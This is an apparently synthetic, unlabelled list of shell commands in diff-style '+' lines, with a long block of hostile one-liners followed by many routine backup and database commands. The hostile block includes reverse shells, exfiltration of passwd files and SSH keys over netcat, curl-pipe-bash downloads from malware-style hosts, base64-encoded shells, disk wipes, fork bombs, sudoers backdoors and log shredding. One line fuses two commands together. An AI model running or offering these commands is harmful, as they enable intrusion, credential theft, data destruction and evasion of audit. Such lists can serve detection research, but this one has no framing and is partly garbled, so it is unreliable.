+bash -i >& /dev/tcp/10.10.1.5/9001 0>&1
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 4444
+dd if=/dev/zero of=/dev/sda
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+bash -i >& /dev/tcp/192.168.1.24/9001 0>&1
+rm -rf / --no-preserve-root
+curl http://103.22.12.5/backup_daily.sh | bash
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/192.168.1.24/8888 0>&1
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+:(){ :|:& };:
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 172.16.4.2 8888
+:(){ :|:& };:
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+cat /etc/passwd | nc 10.10.1.5 443
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+nc -e /bin/sh 172.16.4.2 443
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+bash -i >& /dev/tcp/8.8.4.4/443 0>&1
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/shadow
+bash -i >& /dev/tcp/8.8.4.4/4444 0>&1
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+cat /etc/passwd | nc 127.0.0.1 8888
+sudo chmod 4755 /bin/bash
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 172.16.4.2 4444
+cat /etc/passwd | nc 172.16.4.2 1337
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 127.0.0.1 4444
+cat /etc/shadow
+cat /etc/shadow
+rm -rf / --no-preserve-root
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+bash -i >& /dev/tcp/192.168.1.24/4444 0>&1
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+curl http://malware-repo.io/data_dump.sh | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+bash -i >& /dev/tcp/10.10.1.5/9001 0>&1
+bash -i >& /dev/tcp/192.168.1.24/443 0>&1
+bash -i >& /dev/tcp/10.10.1.5/1337 0>&1
+:(){ :|:& };:
+curl http://evil-cdn.com/test_suite.sh | bash
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 127.0.0.1 9001
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+curl http://c2-server.net/auth_server.sh | bash
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+nc -e /bin/sh 10.10.1.5 8888
+rm -rf / --no-preserve-root
+bash -i >& /dev/tcp/192.168.1.24/9001 0>&1
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 9001
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 1337
+curl http://103.22.12.5/data_dump.sh | bash
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 10.10.1.5 1337
+shred -n 33 -uz /var/log/auth.log
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+curl http://103.22.12.5/auth_server.sh | bash
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadowawk '{sum+=$NF} END{print sum}' /tmp/backup_daily_172.csv
+rsync -avz /opt/app/main_script_915/ deploy@192.168.1.24:/opt/app/main_script_915_backup/
+mysqldump -u deploy -p auth_serverdb_781 > /tmp/auth_server_backup_781.sql
+grep -n 'retry' /tmp/backup_daily_703.conf
+rsync -av /data/auth_server_746/ /data/auth_server_746_backup/
+rsync -avz /etc/monitor_509/ ec2-user@10.0.0.5:/etc/monitor_509_backup/
+git show HEAD:/tmp/api_gateway_461.conf
+rsync -avz /opt/app/main_script_701/ jenkins@10.10.1.5:/opt/app/main_script_701_backup/
+rsync -avz /usr/local/bin/syslog_760/ sysadmin@127.0.0.1:/usr/local/bin/syslog_760_backup/
+rsync -av /mnt/storage/worker_593/ /mnt/storage/worker_593_backup/
+rsync -av /opt/app/monitor_692/ /opt/app/monitor_692_backup/
+pg_restore -U git -d backup_dailydb /tmp/backup_daily_286.sql
+rsync -avz /data/data_dump_166/ dev_user@127.0.0.1:/data/data_dump_166_backup/
+rsync -avz /mnt/storage/worker_140/ alice@172.16.4.2:/mnt/storage/worker_140_backup/
+rsync -av /usr/local/bin/auth_server_784/ /usr/local/bin/auth_server_784_backup/
+rsync -avz /tmp/auth_server_167/ dev_user@10.10.1.5:/tmp/auth_server_167_backup/
+awk '{sum+=$NF} END{print sum}' /tmp/webapp_923.csv
+mysqldump -u git -p schedulerdb_341 > /tmp/scheduler_backup_341.sql
+rsync -avz /home/user/webapp_821/ deploy@192.168.1.24:/home/user/webapp_821_backup/
+rsync -avz /var/log/monitor_795/ sysadmin@10.10.1.5:/var/log/monitor_795_backup/
+tar xzf /tmp/api_gateway_217_backup.tar.gz -C /srv/web/
+rsync -avz /data/main_script_474/ admin@10.0.0.5:/data/main_script_474_backup/
+mysqldump -u jenkins -p db_migratedb_544 > /tmp/db_migrate_backup_544.sql
+mysqldump -u ec2-user -p workerdb_151 > /tmp/worker_backup_151.sql
+tar xzf /tmp/webapp_194_backup.tar.gz -C /home/user/
+rsync -avz /etc/worker_399/ deploy@172.16.4.2:/etc/worker_399_backup/
+rsync -avz /mnt/storage/syslog_898/ alice@10.10.1.5:/mnt/storage/syslog_898_backup/
+rsync -av /home/user/auth_server_659/ /home/user/auth_server_659_backup/
+rsync -avz /opt/app/monitor_508/ sysadmin@172.16.4.2:/opt/app/monitor_508_backup/
+rsync -avz /srv/web/webapp_556/ sysadmin@127.0.0.1:/srv/web/webapp_556_backup/
+rsync -avz /etc/data_dump_852/ bob@192.168.0.10:/etc/data_dump_852_backup/
+mysqldump -u alice -p auth_serverdb_393 > /tmp/auth_server_backup_393.sql
+awk '{sum+=$NF} END{print sum}' /tmp/db_migrate_203.csv
+rsync -avz /srv/web/deploy_545/ bob@127.0.0.1:/srv/web/deploy_545_backup/
+rsync -avz /tmp/auth_server_126/ admin@192.168.1.24:/tmp/auth_server_126_backup/
+rsync -av /tmp/monitor_615/ /tmp/monitor_615_backup/
+rsync -av /opt/app/db_migrate_382/ /opt/app/db_migrate_382_backup/
+pg_restore -U ubuntu -d backup_dailydb /tmp/backup_daily_422.sql
+rsync -av /tmp/db_migrate_163/ /tmp/db_migrate_163_backup/
+rsync -av /data/main_script_822/ /data/main_script_822_backup/
+mysql -u admin -p workerdb < /tmp/worker_253.sql
+pg_dump -U ec2-user monitordb > /tmp/monitor_951.sql
+rsync -av /mnt/storage/worker_118/ /mnt/storage/worker_118_backup/
+sed -i 's/old_rollback/new_rollback/g' /tmp/worker_507.conf
+tar xzf /tmp/config_prod_911_backup.tar.gz -C /srv/web/
+rsync -avz /mnt/storage/scheduler_701/ jenkins@192.168.0.10:/mnt/storage/scheduler_701_backup/
+rsync -avz /opt/app/main_script_391/ sysadmin@10.0.0.5:/opt/app/main_script_391_backup/
+rsync -av /var/log/setup_932/ /var/log/setup_932_backup/
+rsync -avz /mnt/storage/db_migrate_462/ ec2-user@10.10.1.5:/mnt/storage/db_migrate_462_backup/
+grep -n 'validation' /tmp/syslog_340.conf
+tar xzf /tmp/api_gateway_195_backup.tar.gz -C /usr/local/bin/
+pg_restore -U alice -d backup_dailydb /tmp/backup_daily_923.sql
+git show HEAD:/tmp/setup_642.conf
+mysqldump -u sysadmin -p workerdb_399 > /tmp/worker_backup_399.sql
+pg_restore -U ec2-user -d config_proddb /tmp/config_prod_543.sql
+tar czf /tmp/backup_daily_297_backup.tar.gz /mnt/storage/backup_daily_297/
+tar xzf /tmp/main_script_105_backup.tar.gz -C /usr/local/bin/
+readlink -f /tmp/auth_server_933.conf
+rsync -av /data/worker_745/ /data/worker_745_backup/
+rsync -av /etc/config_prod_296/ /etc/config_prod_296_backup/
+pg_dump -U dev_user backup_dailydb > /tmp/backup_daily_403.sql
+rsync -avz /etc/main_script_757/ bob@172.16.4.2:/etc/main_script_757_backup/
+rsync -av /tmp/config_prod_872/ /tmp/config_prod_872_backup/
+git show HEAD:/tmp/syslog_497.conf
+tar czf /tmp/deploy_630_backup.tar.gz /mnt/storage/deploy_630/
+rsync -av /tmp/auth_server_580/ /tmp/auth_server_580_backup/
+rsync -avz /home/user/test_suite_658/ alice@192.168.1.24:/home/user/test_suite_658_backup/
+rsync -avz /usr/local/bin/backup_daily_729/ deploy@192.168.0.10:/usr/local/bin/backup_daily_729_backup/
+rsync -avz /mnt/storage/config_prod_242/ ec2-user@10.10.1.5:/mnt/storage/config_prod_242_backup/
+grep -n 'syntax' /tmp/scheduler_704.conf
+rsync -avz /opt/app/webapp_748/ alice@192.168.0.10:/opt/app/webapp_748_backup/
+rsync -avz /home/user/db_migrate_778/ sysadmin@10.10.1.5:/home/user/db_migrate_778_backup/
+awk '{sum+=$NF} END{print sum}' /tmp/backup_daily_898.csv
+rsync -av /etc/main_script_491/ /etc/main_script_491_backup/
+nohup python3 /tmp/worker_167.py > /tmp/logs/worker_167.log 2>&1 &
+mysqldump -u dev_user -p db_migratedb_531 > /tmp/db_migrate_backup_531.sql
+rsync -avz /usr/local/bin/config_prod_150/ alice@172.16.4.2:/usr/local/bin/config_prod_150_backup/
+tar xzf /tmp/webapp_503_backup.tar.gz -C /home/user/
+rsync -avz /home/user/setup_533/ ec2-user@10.10.1.5:/home/user/setup_533_backup/
+mysqldump -u alice -p db_migratedb_790 > /tmp/db_migrate_backup_790.sql
+rsync -av /opt/app/config_prod_396/ /opt/app/config_prod_396_backup/
+git show HEAD:/tmp/scheduler_136.conf
+mysqldump -u jenkins -p db_migratedb_687 > /tmp/db_migrate_backup_687.sql
+tar xzf /tmp/scheduler_420_backup.tar.gz -C /home/user/
+rsync -avz /usr/local/bin/main_script_776/ deploy@10.0.0.5:/usr/local/bin/main_script_776_backup/
+rsync -avz /mnt/storage/backup_daily_285/ admin@172.16.4.2:/mnt/storage/backup_daily_285_backup/
+mysqldump -u jenkins -p db_migratedb_707 > /tmp/db_migrate_backup_707.sql
+rsync -av /data/monitor_527/ /data/monitor_527_backup/
+awk '{print $1}' /tmp/api_gateway_749.log | sort | uniq -c | sort -rn | head -20
+rsync -avz /data/data_dump_624/ bob@10.0.0.5:/data/data_dump_624_backup/
+awk '{print $1}' /tmp/db_migrate_761.log | sort | uniq -c | sort -rn | head -20
+pg_dump -U alice config_proddb > /tmp/config_prod_259.sql
+rsync -avz /var/log/scheduler_301/ deploy@10.10.1.5:/var/log/scheduler_301_backup/
+rsync -av /etc/worker_880/ /etc/worker_880_backup/
+mysqldump -u admin -p monitordb_913 > /tmp/monitor_backup_913.sql
+git show HEAD:/tmp/deploy_207.conf
+git show HEAD:/tmp/main_script_208.conf
+rsync -avz /srv/web/syslog_457/ jenkins@127.0.0.1:/srv/web/syslog_457_backup/
+git show HEAD:/tmp/data_dump_847.conf
+pg_dump -U ec2-user main_scriptdb > /tmp/main_script_378.sql
+python3 -m flake8 /tmp/db_migrate_794.py
+rsync -av /etc/backup_daily_369/ /etc/backup_daily_369_backup/
+tar xzf /tmp/db_migrate_217_backup.tar.gz -C /var/log/
+git show HEAD:/tmp/worker_378.conf
+rsync -av /var/log/webapp_429/ /var/log/webapp_429_backup/
+rsync -av /tmp/main_script_885/ /tmp/main_script_885_backup/
+rsync -av /usr/local/bin/config_prod_904/ /usr/local/bin/config_prod_904_backup/
+pg_restore -U alice -d backup_dailydb /tmp/backup_daily_386.sql
+awk '{print $1}' /tmp/monitor_299.log | sort | uniq -c | sort -rn | head -20
+tar czf /tmp/backup_daily_307_backup.tar.gz /home/user/backup_daily_307/
+readlink -f /tmp/api_gateway_706.conf
+rsync -av /mnt/storage/api_gateway_756/ /mnt/storage/api_gateway_756_backup/
+awk '{sum+=$NF} END{print sum}' /tmp/setup_508.csv
+python3 -m flake8 /tmp/auth_server_605.py
+tar xzf /tmp/syslog_284_backup.tar.gz -C /etc/
+rsync -avz /data/main_script_775/ ubuntu@10.10.1.5:/data/main_script_775_backup/
+rsync -avz /etc/config_prod_758/ deploy@172.16.4.2:/etc/config_prod_758_backup/
+rsync -av /opt/app/scheduler_664/ /opt/app/scheduler_664_backup/
+rsync -avz /var/log/backup_daily_534/ jenkins@127.0.0.1:/var/log/backup_daily_534_backup/
+git show HEAD:/tmp/db_migrate_458.conf
+rsync -av /tmp/backup_daily_928/ /tmp/backup_daily_928_backup/
+rsync -avz /usr/local/bin/syslog_883/ admin@192.168.1.24:/usr/local/bin/syslog_883_backup/
+mysqldump -u admin -p schedulerdb_159 > /tmp/scheduler_backup_159.sql
+pg_dump -U alice workerdb > /tmp/worker_231.sql
+pg_restore -U sysadmin -d backup_dailydb /tmp/backup_daily_696.sql
+pg_restore -U sysadmin -d config_proddb /tmp/config_prod_298.sql
+rsync -avz /mnt/storage/webapp_962/ git@192.168.0.10:/mnt/storage/webapp_962_backup/
+rsync -avz /srv/web/db_migrate_339/ sysadmin@10.0.0.5:/srv/web/db_migrate_339_backup/
+rsync -av /mnt/storage/api_gateway_313/ /mnt/storage/api_gateway_313_backup/
+chmod 644 /tmp/auth_server_190.conf
+grep -A 3 -B 3 'validation' /tmp/scheduler_973.log
+rsync -av /home/user/deploy_849/ /home/user/deploy_849_backup/
+tar xzf /tmp/syslog_475_backup.tar.gz -C /mnt/storage/
+rsync -avz /data/syslog_922/ ec2-user@192.168.0.10:/data/syslog_922_backup/
+tar xzf /tmp/backup_daily_163_backup.tar.gz -C /etc/
+rsync -avz /opt/app/syslog_249/ ubuntu@127.0.0.1:/opt/app/syslog_249_backup/
+readlink -f /tmp/auth_server_597.conf
+screen -S config_prod_625 -dm bash /tmp/config_prod_625.sh
+mysqldump -u jenkins -p db_migratedb_841 > /tmp/db_migrate_backup_841.sql
+tar xzf /tmp/backup_daily_324_backup.tar.gz -C /var/log/
+rsync -avz /opt/app/db_migrate_356/ dev_user@172.16.4.2:/opt/app/db_migrate_356_backup/
+rsync -avz /etc/backup_daily_722/ bob@10.10.1.5:/etc/backup_daily_722_backup/
+mysqldump -u dev_user -p api_gatewaydb_209 > /tmp/api_gateway_backup_209.sql
+rsync -avz /mnt/storage/db_migrate_657/ dev_user@10.10.1.5:/mnt/storage/db_migrate_657_backup/
+tar xzf /tmp/main_script_782_backup.tar.gz -C /srv/web/
+rsync -av /opt/app/test_suite_732/ /opt/app/test_suite_732_backup/
+pg_dump -U ec2-user config_proddb > /tmp/config_prod_881.sql
+rsync -av /srv/web/scheduler_184/ /srv/web/scheduler_184_backup/
+mysqldump -u jenkins -p deploydb_216 > /tmp/deploy_backup_216.sql
+rsync -av /opt/app/worker_898/ /opt/app/worker_898_backup/
+git show HEAD:/tmp/backup_daily_638.conf
+pg_restore -U ec2-user -d backup_dailydb /tmp/backup_daily_717.sql
+rsync -av /home/user/db_migrate_701/ /home/user/db_migrate_701_backup/
+rsync -av /mnt/storage/config_prod_892/ /mnt/storage/config_prod_892_backup/
+rsync -av /opt/app/deploy_978/ /opt/app/deploy_978_backup/
+mysqldump -u bob -p db_migratedb_159 > /tmp/db_migrate_backup_159.sql
+awk '{sum+=$NF} END{print sum}' /tmp/db_migrate_332.csv
+rsync -avz /opt/app/scheduler_544/ ec2-user@10.0.0.5:/opt/app/scheduler_544_backup/
+readlink -f /tmp/scheduler_612.conf
+rsync -avz /var/log/data_dump_221/ admin@192.168.1.24:/var/log/data_dump_221_backup/
+tar xzf /tmp/deploy_155_backup.tar.gz -C /var/log/
+rsync -avz /data/api_gateway_558/ sysadmin@192.168.1.24:/data/api_gateway_558_backup/
+rsync -avz /data/backup_daily_206/ bob@10.10.1.5:/data/backup_daily_206_backup/
+cut -d',' -f1,2 /tmp/config_prod_702.csv
+git show HEAD:/tmp/auth_server_577.conf
+awk '{print $1}' /tmp/worker_349.log | sort | uniq -c | sort -rn | head -20
+rsync -av /var/log/monitor_395/ /var/log/monitor_395_backup/
+rsync -avz /srv/web/db_migrate_683/ ec2-user@192.168.1.24:/srv/web/db_migrate_683_backup/
+rsync -avz /usr/local/bin/config_prod_971/ bob@172.16.4.2:/usr/local/bin/config_prod_971_backup/
+tar xzf /tmp/syslog_408_backup.tar.gz -C /srv/web/
+readlink -f /tmp/auth_server_990.conf
+rsync -av /srv/web/api_gateway_314/ /srv/web/api_gateway_314_backup/
+cut -d',' -f1,2 /tmp/backup_daily_749.csv
+rsync -av /mnt/storage/worker_413/ /mnt/storage/worker_413_backup/
+rsync -avz /usr/local/bin/backup_daily_647/ deploy@192.168.0.10:/usr/local/bin/backup_daily_647_backup/
+rsync -av /srv/web/auth_server_299/ /srv/web/auth_server_299_backup/
+rsync -av /etc/deploy_356/ /etc/deploy_356_backup/
+mysqldump -u alice -p workerdb_601 > /tmp/worker_backup_601.sql
+rsync -avz /opt/app/test_suite_152/ alice@10.0.0.5:/opt/app/test_suite_152_backup/
+rsync -av /srv/web/test_suite_761/ /srv/web/test_suite_761_backup/
+rsync -avz /srv/web/api_gateway_351/ git@172.16.4.2:/srv/web/api_gateway_351_backup/
+rsync -avz /opt/app/scheduler_996/ admin@192.168.1.24:/opt/app/scheduler_996_backup/
+git blame /tmp/backup_daily_195.py | head -20
+rsync -avz /mnt/storage/test_suite_636/ ubuntu@192.168.0.10:/mnt/storage/test_suite_636_backup/
+git show HEAD:/tmp/db_migrate_395.conf
+rsync -av /data/worker_665/ /data/worker_665_backup/
+awk '{print $1}' /tmp/config_prod_294.log | sort | uniq -c | sort -rn | head -20
+mysqldump -u deploy -p auth_serverdb_264 > /tmp/auth_server_backup_264.sql
+rsync -av /opt/app/data_dump_170/ /opt/app/data_dump_170_backup/
+rsync -av /tmp/setup_629/ /tmp/setup_629_backup/
+awk '{print $1}' /tmp/auth_server_109.log | sort | uniq -c | sort -rn | head -20
+rsync -av /opt/app/worker_428/ /opt/app/worker_428_backup/
+rsync -av /var/log/deploy_415/ /var/log/deploy_415_backup/
+rsync -av /usr/local/bin/worker_389/ /usr/local/bin/worker_389_backup/
+python3 -m isort /tmp/backup_daily_846.py
+rsync -avz /etc/api_gateway_717/ ubuntu@127.0.0.1:/etc/api_gateway_717_backup/
+rsync -avz /etc/test_suite_985/ alice@127.0.0.1:/etc/test_suite_985_backup/
+mysqldump -u alice -p monitordb_743 > /tmp/monitor_backup_743.sql
+rsync -avz /home/user/setup_668/ alice@192.168.1.24:/home/user/setup_668_backup/
+rsync -avz /home/user/db_migrate_983/ sysadmin@10.10.1.5:/home/user/db_migrate_983_backup/
+rsync -avz /home/user/api_gateway_633/ dev_user@192.168.0.10:/home/user/api_gateway_633_backup/
+mysqldump -u jenkins -p api_gatewaydb_248 > /tmp/api_gateway_backup_248.sql
+rsync -av /home/user/scheduler_430/ /home/user/scheduler_430_backup/
+rsync -av /opt/app/syslog_104/ /opt/app/syslog_104_backup/
+rsync -av /etc/api_gateway_362/ /etc/api_gateway_362_backup/
+rsync -avz /opt/app/worker_644/ git@127.0.0.1:/opt/app/worker_644_backup/
+rsync -av /opt/app/monitor_511/ /opt/app/monitor_511_backup/
+tar xzf /tmp/worker_278_backup.tar.gz -C /usr/local/bin/
+awk '{sum+=$NF} END{print sum}' /tmp/webapp_812.csv
+tar xzf /tmp/webapp_636_backup.tar.gz -C /usr/local/bin/
+rsync -av /srv/web/syslog_645/ /srv/web/syslog_645_backup/
+rsync -avz /mnt/storage/test_suite_370/ jenkins@192.168.1.24:/mnt/storage/test_suite_370_backup/
+mysqldump -u jenkins -p config_proddb_391 > /tmp/config_prod_backup_391.sql
+rsync -avz /opt/app/auth_server_986/ alice@10.0.0.5:/opt/app/auth_server_986_backup/
+python3 -m black /tmp/db_migrate_654.py
+rsync -avz /srv/web/deploy_628/ sysadmin@172.16.4.2:/srv/web/deploy_628_backup/
+rsync -av /data/webapp_555/ /data/webapp_555_backup/
+rsync -av /tmp/webapp_970/ /tmp/webapp_970_backup/
+rsync -av /srv/web/worker_220/ /srv/web/worker_220_backup/
+awk '{print $1}' /tmp/scheduler_390.log | sort | uniq -c | sort -rn | head -20
+rsync -avz /srv/web/config_prod_691/ jenkins@172.16.4.2:/srv/web/config_prod_691_backup/
+awk '{sum+=$NF} END{print sum}' /tmp/worker_908.csv
+tar czf /tmp/deploy_201_backup.tar.gz /srv/web/deploy_201/
+rsync -avz /data/db_migrate_861/ git@192.168.1.24:/data/db_migrate_861_backup/
+mysql -u ec2-user -p db_migratedb < /tmp/db_migrate_509.sql
+tar czf /tmp/config_prod_468_backup.tar.gz /srv/web/config_prod_468/
+rsync -avz /usr/local/bin/api_gateway_725/ admin@10.0.0.5:/usr/local/bin/api_gateway_725_backup/
+rsync -av /mnt/storage/monitor_851/ /mnt/storage/monitor_851_backup/
+mysql -u admin -p workerdb < /tmp/worker_231.sql
+rsync -av /data/config_prod_626/ /data/config_prod_626_backup/
+rsync -avz /tmp/data_dump_144/ ec2-user@192.168.1.24:/tmp/data_dump_144_backup/
+rsync -avz /opt/app/setup_811/ deploy@192.168.1.24:/opt/app/setup_811_backup/
+awk '{print $1}' /tmp/main_script_516.log | sort | uniq -c | sort -rn | head -20
+rsync -avz /mnt/storage/webapp_359/ bob@172.16.4.2:/mnt/storage/webapp_359_backup/
+rsync -av /usr/local/bin/config_prod_768/ /usr/local/bin/config_prod_768_backup/
+rsync -av /usr/local/bin/test_suite_670/ /usr/local/bin/test_suite_670_backup/
+git show HEAD:/tmp/api_gateway_119.conf
+rsync -avz /tmp/db_migrate_950/ admin@192.168.1.24:/tmp/db_migrate_950_backup/
+rsync -avz /data/webapp_917/ ubuntu@10.10.1.5:/data/webapp_917_backup/
+rsync -av /var/log/scheduler_666/ /var/log/scheduler_666_backup/
+tar czf /tmp/backup_daily_814_backup.tar.gz /home/user/backup_daily_814/
+rsync -avz /data/deploy_154/ sysadmin@192.168.0.10:/data/deploy_154_backup/
+cut -d',' -f1,2 /tmp/webapp_543.csv
+rsync -avz /etc/data_dump_366/ ec2-user@127.0.0.1:/etc/data_dump_366_backup/
+mysql -u jenkins -p config_proddb < /tmp/config_prod_361.sql
+mysqldump -u bob -p workerdb_892 > /tmp/worker_backup_892.sql
+awk '{print $1}' /tmp/scheduler_876.log | sort | uniq -c | sort -rn | head -20
+tar xzf /tmp/db_migrate_863_backup.tar.gz -C /home/user/
+tar czf /tmp/deploy_807_backup.tar.gz /srv/web/deploy_807/
+rsync -avz /usr/local/bin/main_script_563/ admin@192.168.1.24:/usr/local/bin/main_script_563_backup/
+diff /tmp/auth_server_590.conf /tmp/auth_server_590_backup.conf
+rsync -av /opt/app/syslog_481/ /opt/app/syslog_481_backup/
+rsync -av /opt/app/data_dump_980/ /opt/app/data_dump_980_backup/
+rsync -avz /var/log/deploy_349/ admin@192.168.1.24:/var/log/deploy_349_backup/
+rsync -avz /opt/app/data_dump_867/ admin@10.10.1.5:/opt/app/data_dump_867_backup/
+mysql -u ec2-user -p db_migratedb < /tmp/db_migrate_534.sql
+rsync -avz /mnt/storage/auth_server_537/ admin@192.168.0.10:/mnt/storage/auth_server_537_backup/
+tar xzf /tmp/syslog_528_backup.tar.gz -C /var/log/
+rsync -av /var/log/deploy_434/ /var/log/deploy_434_backup/
+rsync -av /etc/worker_913/ /etc/worker_913_backup/
+rsync -av /tmp/backup_daily_785/ /tmp/backup_daily_785_backup/
+rsync -av /etc/backup_daily_751/ /etc/backup_daily_751_backup/
+rsync -av /opt/app/scheduler_674/ /opt/app/scheduler_674_backup/
+rsync -avz /srv/web/webapp_907/ bob@10.10.1.5:/srv/web/webapp_907_backup/
+rsync -avz /mnt/storage/webapp_800/ alice@172.16.4.2:/mnt/storage/webapp_800_backup/
+unzip /tmp/scheduler_341.zip -d /var/log/
+tar xzf /tmp/db_migrate_443_backup.tar.gz -C /usr/local/bin/
+mysqldump -u dev_user -p main_scriptdb_703 > /tmp/main_script_backup_703.sql
+mysqldump -u bob -p db_migratedb_391 > /tmp/db_migrate_backup_391.sql
+rsync -av /mnt/storage/auth_server_613/ /mnt/storage/auth_server_613_backup/
+rsync -av /data/monitor_463/ /data/monitor_463_backup/
+git show HEAD:/tmp/syslog_568.conf
+git blame /tmp/backup_daily_618.py | head -20
+rsync -avz /etc/config_prod_838/ jenkins@10.0.0.5:/etc/config_prod_838_backup/
+rsync -avz /tmp/api_gateway_605/ ec2-user@172.16.4.2:/tmp/api_gateway_605_backup/
+awk '{print $1}' /tmp/config_prod_696.log | sort | uniq -c | sort -rn | head -20
+tar xzf /tmp/main_script_254_backup.tar.gz -C /var/log/
+rsync -avz /usr/local/bin/main_script_755/ admin@10.10.1.5:/usr/local/bin/main_script_755_backup/
+tar xzf /tmp/config_prod_796_backup.tar.gz -C /home/user/
+tar czf /tmp/deploy_492_backup.tar.gz /home/user/deploy_492/
+tar xzf /tmp/scheduler_946_backup.tar.gz -C /home/user/
+rsync -avz /home/user/api_gateway_803/ admin@192.168.1.24:/home/user/api_gateway_803_backup/
+awk '{sum+=$NF} END{print sum}' /tmp/scheduler_996.csv
+rsync -av /home/user/deploy_546/ /home/user/deploy_546_backup/
+mysqldump -u bob -p config_proddb_654 > /tmp/config_prod_backup_654.sql
+rsync -avz /data/main_script_850/ jenkins@10.10.1.5:/data/main_script_850_backup/
+pg_dump -U admin schedulerdb > /tmp/scheduler_523.sql
+sed -n '10,50p' /tmp/db_migrate_693.log
+pg_dump -U jenkins config_proddb > /tmp/config_prod_532.sql
+mysqldump -u dev_user -p config_proddb_376 > /tmp/config_prod_backup_376.sql
+git show HEAD:/tmp/auth_server_971.conf
+rsync -avz /mnt/storage/webapp_337/ jenkins@192.168.0.10:/mnt/storage/webapp_337_backup/
+rsync -av /home/user/test_suite_616/ /home/user/test_suite_616_backup/
+awk '{print $1}' /tmp/deploy_684.log | sort | uniq -c | sort -rn | head -20
+rsync -av /tmp/syslog_732/ /tmp/syslog_732_backup/
+tar xzf /tmp/test_suite_224_backup.tar.gz -C /usr/local/bin/
+rsync -avz /usr/local/bin/worker_666/ ec2-user@192.168.0.10:/usr/local/bin/worker_666_backup/
+rsync -av /opt/app/auth_server_533/ /opt/app/auth_server_533_backup/
+rsync -av /usr/local/bin/syslog_760/ /usr/local/bin/syslog_760_backup/
+pg_restore -U jenkins -d auth_serverdb /tmp/auth_server_865.sql
+tar xzf /tmp/monitor_691_backup.tar.gz -C /home/user/
+unzip /tmp/backup_daily_293.zip -d /home/user/
+rsync -av /data/setup_868/ /data/setup_868_backup/
+tar xzf /tmp/backup_daily_509_backup.tar.gz -C /var/log/
+mysql -u jenkins -p backup_dailydb < /tmp/backup_daily_358.sql
+mysqldump -u sysadmin -p auth_serverdb_809 > /tmp/auth_server_backup_809.sql
+rsync -av /opt/app/data_dump_657/ /opt/app/data_dump_657_backup/
